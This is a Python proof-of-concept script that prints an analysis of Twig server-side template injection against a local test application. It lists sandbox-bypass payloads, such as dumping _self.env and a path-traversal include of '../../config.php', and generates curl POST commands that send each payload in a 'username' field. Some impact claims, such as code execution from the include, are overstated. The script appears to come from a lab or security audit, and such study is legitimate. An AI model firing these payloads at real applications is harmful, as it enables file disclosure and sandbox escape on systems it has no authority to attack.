#!/usr/bin/env python3
"""
Twig SSTI Sandbox Bypass Analysis POC
Target: http://localhost:8081/index.php
Objective: Identify and document SSTI vulnerabilities in Twig sandbox configuration

This POC demonstrates:
1. How htmlspecialchars() doesn't prevent template injection
2. How allowed functions can be abused
3. How sandbox can be bypassed through object manipulation
"""

import urllib.parse
import sys

class TwigSSTIAnalyzer:
    """Analyzes Twig SSTI vulnerabilities"""
    
    def __init__(self):
        self.target = "http://localhost:8081/index.php"
        self.allowed_tags = ['for', 'if', 'block', 'extends', 'include', 'set', 'do']
        self.allowed_filters = ['escape', 'raw', 'upper', 'lower', 'striptags', 'replace']
        self.allowed_functions = ['range', 'constant', 'cycle', 'dump', 'include']
        self.restricted_methods = {'RandomHash': ['getValue']}
    
    def htmlspecialchars_analysis(self):
        """Analyze how htmlspecialchars affects SSTI payloads"""
        print("=" * 70)
        print("HTMLSPECIALCHARS ANALYSIS")
        print("=" * 70)
        
        payloads = [
            '{{ 7*7 }}',
            '{{ _self }}',
            '{{ _self.env.globals }}',
            '{% set x=7 %}{{ x }}',
            '{{ include("file") }}',
        ]
        
        print("\nPayload Analysis - htmlspecialchars() impact:")
        print("-" * 70)
        for payload in payloads:
            # htmlspecialchars only escapes: < > " ' &
            escaped = (payload.replace('&', '&amp;')
                              .replace('<', '&lt;')
                              .replace('>', '&gt;')
                              .replace('"', '&quot;')
                              .replace("'", '&#039;'))
            
            print(f"\nOriginal:   {payload}")
            print(f"After HSC:  {escaped}")
            print(f"Escaping:   {'YES' if escaped != payload else 'NO'}")
        
        print("\n\nKEY FINDING: {{ 7*7 }} contains no escapable characters!")
        print("htmlspecialchars() will NOT modify it!")
        print("This allows SSTI bypass through htmlspecialchars.")
    
    def sandbox_bypass_analysis(self):
        """Analyze sandbox bypass vectors"""
        print("\n" + "=" * 70)
        print("SANDBOX BYPASS VECTORS ANALYSIS")
        print("=" * 70)
        
        bypasses = {
            "Allowed Tags": {
                "for": "Can loop and iterate - might enable complex operations",
                "if": "Conditional logic - could be abused",
                "set": "Variable assignment - could set objects/values",
                "include": "Template inclusion - potential local file inclusion",
                "do": "Execute statements",
            },
            "Allowed Functions": {
                "dump": "Introspection function - reveals object internals",
                "include": "Template loading - path traversal possible",
                "range": "Generates sequences - could be abused",
                "constant": "Access class constants - dangerous",
                "cycle": "Array cycling - might leak data",
            },
            "Allowed Filters": {
                "raw": "Prevents escaping - if combined with template data, SSTI possible",
                "replace": "String manipulation",
                "striptags": "HTML removal",
                "upper/lower": "Case conversion",
                "escape": "HTML escaping",
            }
        }
        
        for category, items in bypasses.items():
            print(f"\n{category}:")
            print("-" * 70)
            for item, description in items.items():
                print(f"  • {item:20} - {description}")
    
    def object_access_analysis(self):
        """Analyze unauthorized object access possibilities"""
        print("\n" + "=" * 70)
        print("RANDOMHASH OBJECT ACCESS ANALYSIS")
        print("=" * 70)
        
        print("\nSecurity Policy allows only:")
        print("  Methods: ['getValue']")
        print("  Property access: [name, description, value]")
        
        print("\nUnauthorized access attempts:")
        print("-" * 70)
        
        unauthorized_accesses = [
            ('{{ randomHash.secret }}', 'Access private $secret property'),
            ('{{ randomHash.__construct() }}', 'Call __construct magic method'),
            ('{{ randomHash.__get("secret") }}', 'Use __get magic method'),
            ('{{ randomHash[0] }}', 'Array access to object'),
            ('{{ dump(randomHash) }}', 'Dump entire object (allowed dump function!)'),
            ('{% for key in randomHash %}{{ key }}{% endfor %}', 'Iterate object properties'),
        ]
        
        for payload, description in unauthorized_accesses:
            print(f"\nPayload: {payload}")
            print(f"Purpose: {description}")
            print(f"Danger:  May bypass sandbox restrictions")
    
    def critical_vulnerabilities(self):
        """Identify critical vulnerabilities"""
        print("\n" + "=" * 70)
        print("CRITICAL VULNERABILITY FINDINGS")
        print("=" * 70)
        
        print("\n1. DUMP FUNCTION VULNERABILITY:")
        print("   - dump() is allowed in sandbox")
        print("   - Can dump any object including _self")
        print("   - Payload: {{ dump(_self) }}")
        print("   - Impact: Full environment introspection, object leak")
        
        print("\n2. INCLUDE FUNCTION VULNERABILITY:")
        print("   - include() is allowed in sandbox")
        print("   - Can include arbitrary template files")
        print("   - Payload: {{ include(\"../../config.php\") }}")
        print("   - Impact: Local file inclusion, code execution")
        
        print("\n3. HTMLSPECIALCHARS BYPASS:")
        print("   - Twig code contains no HTML special characters")
        print("   - htmlspecialchars() doesn't prevent SSTI")
        print("   - Payload: {{ 7*7 }}")
        print("   - Impact: Expression evaluation despite escaping")
        
        print("\n4. SET TAG ABUSE:")
        print("   - SET tag is allowed")
        print("   - Can assign complex values")
        print("   - Payload: {% set x=_self.env %}{{ x }}")
        print("   - Impact: Object assignment and manipulation")
        
        print("\n5. FOR TAG WITH RANGE:")
        print("   - FOR tag + RANGE function both allowed")
        print("   - Can iterate and access globals")
        print("   - Payload: {% for i in range(0,10) %}{{ i }}{% endfor %}")
        print("   - Impact: Data enumeration and extraction")
    
    def generate_payloads(self):
        """Generate all test payloads"""
        print("\n" + "=" * 70)
        print("EXPLOIT PAYLOADS")
        print("=" * 70)
        
        payloads = [
            ("Basic Math", "{{ 7*7 }}"),
            ("Object Introspection", "{{ dump(randomHash) }}"),
            ("Environment Access", "{{ dump(_self.env) }}"),
            ("Template Loader Access", "{{ dump(_self.env.loader) }}"),
            ("Globals Access", "{{ dump(_self.env.globals) }}"),
            ("LFI via Include", "{% include \"../../config.php\" %}"),
            ("Object Property Leak", "{% for key,val in randomHash %}{{ key }}:{{ val }}{% endfor %}"),
            ("Constant Access", "{{ constant(\"PHP_VERSION\") }}"),
            ("Range + Join", "{{ range(1,100)|join(\",\") }}"),
            ("RAW Filter Bypass", "{{ payload|raw }}"),
        ]
        
        print("\nGenerated payloads for POST parameter 'username':\n")
        for name, payload in payloads:
            encoded = urllib.parse.quote_plus(payload)
            print(f"\n{name}:")
            print(f"  Raw:     {payload}")
            print(f"  Encoded: {encoded}")
            print(f"  POST:    curl -d 'username={encoded}' {self.target}")

def main():
    analyzer = TwigSSTIAnalyzer()
    
    analyzer.htmlspecialchars_analysis()
    analyzer.sandbox_bypass_analysis()
    analyzer.object_access_analysis()
    analyzer.critical_vulnerabilities()
    analyzer.generate_payloads()
    
    print("\n" + "=" * 70)
    print("ANALYSIS COMPLETE")
    print("=" * 70)

if __name__ == "__main__":
    main()
